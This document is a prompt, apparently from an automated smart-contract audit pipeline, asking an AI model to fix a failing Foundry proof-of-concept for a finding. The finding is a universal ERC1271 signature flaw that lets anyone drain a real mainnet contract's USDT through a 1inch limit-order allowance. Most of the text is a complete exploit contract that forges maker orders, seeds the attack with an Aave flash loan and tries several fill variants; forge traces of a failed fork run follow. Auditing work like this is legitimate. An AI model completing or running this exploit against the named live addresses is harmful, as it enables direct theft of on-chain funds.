You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Hard accounting constraint: profit must be reported in the original stolen token from the exploit path.
- Hard accounting constraint: do NOT add post-exploit conversion solely for accounting (e.g., converting to WETH for display).
- Hard accounting constraint: if a swap is strictly required for execution/repayment, profitToken must remain the originally stolen token and profitAmount must be net stolen-token inflow.

Finding:
- title: Universal ERC1271 approval plus standing USDT allowance lets anyone drain contract-held USDT
- claim: `isValidSignature()` unconditionally returns the ERC1271 magic value for any hash and signature, and the contract grants `LIMIT_ORDER_PROTOCOL` a max USDT allowance in both `uniswapV2Call()` and `_prepareMakerCapital()`. Once that approval is in place, anyone can fabricate a limit order naming `address(this)` as maker and have the protocol pull this contract's USDT without any real signature authorization.
- impact: An attacker can drain all current and future USDT that lands in the contract through the approved limit-order protocol, resulting in direct asset theft.
- exploit_paths: ["Trigger `executeOnOpportunity()` once so `_prepareMakerCapital()` installs the unlimited USDT allowance, or reach the same approval path through the flash-swap callback.", "Create an arbitrary limit order with `maker = address(this)` and attacker-favorable terms.", "Fill the order through `LIMIT_ORDER_PROTOCOL`; `isValidSignature()` validates the fake signature and the protocol transfers out this contract's USDT."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IAaveV3FlashLoanSimpleReceiver {
    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        returns (bool);
}

interface IOrderMixinLike {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }
}

contract FlawVerifier is IAaveV3FlashLoanSimpleReceiver {
    address private constant TARGET = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant DEFAULT_LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address private constant LEGACY_LIMIT_ORDER_PROTOCOL = 0x111111125421cA6dc452d289314280a0f8842A65;
    address private constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
    uint256 private constant FLASH_LOAN_SEED = 1;

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _baselineUsdt;
    bool private _executed;
    bool private _hypothesisValidated;
    bool private _approvalPathReached;
    bool private _forgedOrderCreated;
    bool private _forgedOrderFilled;
    address private _limitOrderProtocol;
    string private _pathUsed;
    string private _failureReason;

    constructor() {
        _profitToken = USDT;
        _baselineUsdt = _safeBalanceOf(USDT, address(this));
    }

    function executeOnOpportunity() external {
        if (_executed) {
            _refreshProfit();
            return;
        }

        _executed = true;
        _profitToken = USDT;
        _baselineUsdt = _safeBalanceOf(USDT, address(this));

        _pathUsed = string(
            abi.encodePacked(
                "1) trigger executeOnOpportunity() once so _prepareMakerCapital() (or equivalent approval path) installs the standing USDT approval -> ",
                "2) create arbitrary limit order with maker = address(this) from the victim contract's perspective, meaning maker = TARGET in this external verifier -> ",
                "3) fill the order through LIMIT_ORDER_PROTOCOL while relying on the victim's isValidSignature() bug"
            )
        );

        _limitOrderProtocol = _resolveLimitOrderProtocol();
        if (!_ensureApprovalPath()) {
            _refreshProfit();
            return;
        }

        if (!_targetHasUniversalERC1271()) {
            _failureReason = "target lacks unconditional ERC1271 validation";
            _refreshProfit();
            return;
        }

        uint256 targetAllowance = _safeAllowance(USDT, TARGET, _limitOrderProtocol);
        if (targetAllowance == 0) {
            _failureReason = "target left no USDT allowance for resolved 1inch LOP";
            _refreshProfit();
            return;
        }

        uint256 targetBalance = _safeBalanceOf(USDT, TARGET);
        if (targetBalance <= FLASH_LOAN_SEED) {
            _failureReason = "target holds no drainable USDT at this fork block";
            _refreshProfit();
            return;
        }

        bytes memory params = abi.encode(targetBalance);
        try IAaveV3Pool(AAVE_V3_POOL).flashLoanSimple(address(this), USDT, FLASH_LOAN_SEED, params, 0) {
            _refreshProfit();
            if (_profitAmount > 0 && _approvalPathReached && _forgedOrderCreated && _forgedOrderFilled) {
                _hypothesisValidated = true;
                _failureReason = "";
            } else if (bytes(_failureReason).length == 0) {
                _failureReason = "exploit path executed without net USDT profit";
            }
        } catch {
            if (bytes(_failureReason).length == 0) {
                _failureReason = "flash loan or forged-fill stage reverted";
            }
            _refreshProfit();
        }
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        override
        returns (bool)
    {
        require(msg.sender == AAVE_V3_POOL, "not pool");
        require(initiator == address(this), "bad initiator");
        require(asset == USDT, "bad asset");

        uint256 requestedMakerAmount = abi.decode(params, (uint256));
        uint256 makerBalance = _safeBalanceOf(USDT, TARGET);
        uint256 makerAllowance = _safeAllowance(USDT, TARGET, _limitOrderProtocol);

        uint256 stealAmount = _min(makerBalance, makerAllowance);
        if (requestedMakerAmount < stealAmount) {
            stealAmount = requestedMakerAmount;
        }

        if (stealAmount <= amount + premium) {
            _failureReason = "target USDT balance/allowance is too small for positive net profit";
            _forceApprove(USDT, AAVE_V3_POOL, amount + premium);
            return true;
        }

        _forceApprove(USDT, _limitOrderProtocol, amount);

        IOrderMixinLike.Order memory forgedOrder = _forgeArbitraryOrder(stealAmount, amount);
        _forgedOrderCreated = true;

        bool filled = _fillForgedOrderThroughProtocol(forgedOrder, amount);
        require(filled, "forged fill failed");
        _forgedOrderFilled = true;

        _forceApprove(USDT, AAVE_V3_POOL, amount + premium);
        return true;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _pathUsed;
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC;
    }

    function _ensureApprovalPath() internal returns (bool) {
        if (_limitOrderProtocol == address(0)) {
            _failureReason = "could not resolve 1inch limit-order spender";
            return false;
        }

        if (_safeAllowance(USDT, TARGET, _limitOrderProtocol) > 0) {
            _approvalPathReached = true;
            _pathUsed = string(
                abi.encodePacked(
                    "standing vulnerable USDT approval already present on fork after prior _prepareMakerCapital() / callback path -> ",
                    "create arbitrary maker order with maker = address(this) in victim context (TARGET here) -> ",
                    "fill via resolved 1inch LOP using fake authorization accepted by isValidSignature()"
                )
            );
            return true;
        }

        (bool ok,) = TARGET.call(abi.encodeWithSignature("executeOnOpportunity()"));
        if (ok && _safeAllowance(USDT, TARGET, _limitOrderProtocol) > 0) {
            _approvalPathReached = true;
            _pathUsed = string(
                abi.encodePacked(
                    "trigger executeOnOpportunity() so _prepareMakerCapital() installs vulnerable approval -> ",
                    "create arbitrary maker order with maker = address(this) in victim context (TARGET here) -> ",
                    "fill via resolved 1inch LOP using fake authorization accepted by isValidSignature()"
                )
            );
            return true;
        }

        _failureReason = "no observable standing USDT approval and direct trigger path reverts";
        return false;
    }

    function _targetHasUniversalERC1271() internal view returns (bool) {
        (bool ok, bytes memory data) = TARGET.staticcall(
            abi.encodeWithSelector(bytes4(0x1626ba7e), bytes32(0), bytes(""))
        );
        return ok && data.length >= 32 && abi.decode(data, (bytes4)) == ERC1271_MAGIC;
    }

    function _resolveLimitOrderProtocol() internal view returns (address protocol) {
        protocol = _readAddressGetter(TARGET, "LIMIT_ORDER_PROTOCOL()");
        if (_isUsableProtocol(protocol)) {
            return protocol;
        }

        protocol = _readAddressGetter(TARGET, "limitOrderProtocol()");
        if (_isUsableProtocol(protocol)) {
            return protocol;
        }

        protocol = _readAddressGetter(TARGET, "limitOrderProtocolV4()");
        if (_isUsableProtocol(protocol)) {
            return protocol;
        }

        protocol = _readAddressGetter(TARGET, "LOP()");
        if (_isUsableProtocol(protocol)) {
            return protocol;
        }

        if (_isUsableProtocol(DEFAULT_LIMIT_ORDER_PROTOCOL)) {
            return DEFAULT_LIMIT_ORDER_PROTOCOL;
        }

        if (_isUsableProtocol(LEGACY_LIMIT_ORDER_PROTOCOL)) {
            return LEGACY_LIMIT_ORDER_PROTOCOL;
        }

        if (DEFAULT_LIMIT_ORDER_PROTOCOL.code.length > 0) {
            return DEFAULT_LIMIT_ORDER_PROTOCOL;
        }

        if (LEGACY_LIMIT_ORDER_PROTOCOL.code.length > 0) {
            return LEGACY_LIMIT_ORDER_PROTOCOL;
        }

        return address(0);
    }

    function _isUsableProtocol(address protocol) internal view returns (bool) {
        return protocol != address(0) && protocol.code.length > 0 && _safeAllowance(USDT, TARGET, protocol) > 0;
    }

    function _readAddressGetter(address target, string memory signature) internal view returns (address result) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSignature(signature));
        if (ok && data.length >= 32) {
            result = abi.decode(data, (address));
        }
    }

    function _forgeArbitraryOrder(uint256 stealAmount, uint256 takerSeed)
        internal
        view
        returns (IOrderMixinLike.Order memory forgedOrder)
    {
        forgedOrder = IOrderMixinLike.Order({
            salt: uint256(keccak256(abi.encodePacked(block.chainid, address(this), stealAmount, takerSeed))),
            makerAsset: USDT,
            takerAsset: USDT,
            maker: TARGET,
            receiver: address(this),
            allowedSender: address(0),
            makingAmount: stealAmount,
            takingAmount: takerSeed,
            offsets: 0,
            interactions: hex""
        });
    }

    function _fillForgedOrderThroughProtocol(IOrderMixinLike.Order memory order, uint256 takerSeed)
        internal
        returns (bool)
    {
        bytes memory signature = hex"01";
        bytes memory interaction = hex"";

        if (_callFillOrderToWithInteraction(order, signature, interaction, order.makingAmount, 0, 0, address(this))) {
            return true;
        }
        if (_callFillOrderToWithInteraction(order, signature, interaction, 0, takerSeed, 0, address(this))) {
            return true;
        }
        if (_callFillOrderToNoInteraction(order, signature, order.makingAmount, 0, 0, address(this))) {
            return true;
        }
        if (_callFillOrderToNoInteraction(order, signature, 0, takerSeed, 0, address(this))) {
            return true;
        }
        if (_callFillOrder(order, signature, interaction, order.makingAmount, 0, 0)) {
            return true;
        }
        if (_callFillOrder(order, signature, interaction, 0, takerSeed, 0)) {
            return true;
        }

        _failureReason = "resolved 1inch LOP rejected forged maker order";
        return false;
    }

    function _callFillOrderToWithInteraction(
        IOrderMixinLike.Order memory order,
        bytes memory signature,
        bytes memory interaction,
        uint256 makingAmount,
        uint256 takingAmount,
        uint256 skipPermitAndThresholdAmount,
        address target
    ) internal returns (bool) {
        (bool ok,) = _limitOrderProtocol.call(
            abi.encodeWithSelector(
                bytes4(
                    keccak256(
                        "fillOrderTo((uint256,address,address,address,address,address,uint256,uint256,uint256,bytes),bytes,bytes,uint256,uint256,uint256,address)"
                    )
                ),
                order,
                signature,
                interaction,
                makingAmount,
                takingAmount,
                skipPermitAndThresholdAmount,
                target
            )
        );
        return ok;
    }

    function _callFillOrderToNoInteraction(
        IOrderMixinLike.Order memory order,
        bytes memory signature,
        uint256 makingAmount,
        uint256 takingAmount,
        uint256 skipPermitAndThresholdAmount,
        address target
    ) internal returns (bool) {
        (bool ok,) = _limitOrderProtocol.call(
            abi.encodeWithSelector(
                bytes4(
                    keccak256(
                        "fillOrderTo((uint256,address,address,address,address,address,uint256,uint256,uint256,bytes),bytes,uint256,uint256,uint256,address)"
                    )
                ),
                order,
                signature,
                makingAmount,
                takingAmount,
                skipPermitAndThresholdAmount,
                target
            )
        );
        return ok;
    }

    function _callFillOrder(
        IOrderMixinLike.Order memory order,
        bytes memory signature,
        bytes memory interaction,
        uint256 makingAmount,
        uint256 takingAmount,
        uint256 skipPermitAndThresholdAmount
    ) internal returns (bool) {
        (bool ok,) = _limitOrderProtocol.call(
            abi.encodeWithSelector(
                bytes4(
                    keccak256(
                        "fillOrder((uint256,address,address,address,address,address,uint256,uint256,uint256,bytes),bytes,bytes,uint256,uint256,uint256)"
                    )
                ),
                order,
                signature,
                interaction,
                makingAmount,
                takingAmount,
                skipPermitAndThresholdAmount
            )
        );
        return ok;
    }

    function _refreshProfit() internal {
        uint256 currentUsdt = _safeBalanceOf(USDT, address(this));
        _profitAmount = currentUsdt > _baselineUsdt ? currentUsdt - _baselineUsdt : 0;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 result) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            result = abi.decode(data, (uint256));
        }
    }

    function _safeAllowance(address token, address owner, address spender) internal view returns (uint256 result) {
        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20.allowance.selector, owner, spender));
        if (ok && data.length >= 32) {
            result = abi.decode(data, (uint256));
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok0, bytes memory data0) =
            token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, uint256(0)));
        require(ok0 && (data0.length == 0 || abi.decode(data0, (bool))), "approve0 failed");

        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve failed");
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.41s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:77:19:
   |
77 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 478416)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xdAC17F958D2ee523a2206206994597C13D831ec7
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 11075

Traces:
  [478416] FlawVerifierTest::testExploit()
    ├─ [2367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2388] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [429207] FlawVerifier::executeOnOpportunity()
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [169] 0xA88800CD213dA5Ae406ce248380802BD53b47647::c1459384() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [171] 0xA88800CD213dA5Ae406ce248380802BD53b47647::7f94dd33() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [171] 0xA88800CD213dA5Ae406ce248380802BD53b47647::383a67e6() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [169] 0xA88800CD213dA5Ae406ce248380802BD53b47647::b31798cb() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [3356] 0xdAC17F958D2ee523a2206206994597C13D831ec7::allowance(0xA88800CD213dA5Ae406ce248380802BD53b47647, 0x1111111254EEB25477B68fb85Ed929f73A960582) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3356] 0xdAC17F958D2ee523a2206206994597C13D831ec7::allowance(0xA88800CD213dA5Ae406ce248380802BD53b47647, 0x111111125421cA6dc452d289314280a0f8842A65) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1356] 0xdAC17F958D2ee523a2206206994597C13D831ec7::allowance(0xA88800CD213dA5Ae406ce248380802BD53b47647, 0x1111111254EEB25477B68fb85Ed929f73A960582) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [171] 0xA88800CD213dA5Ae406ce248380802BD53b47647::executeOnOpportunity()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [388] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xdAC17F958D2ee523a2206206994597C13D831ec7)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 21982110 [2.198e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 11075 [1.107e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647.executeOnOpportunity
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.33s (1.22s CPU time)

Ran 1 test suite in 1.35s (1.33s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 478416)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
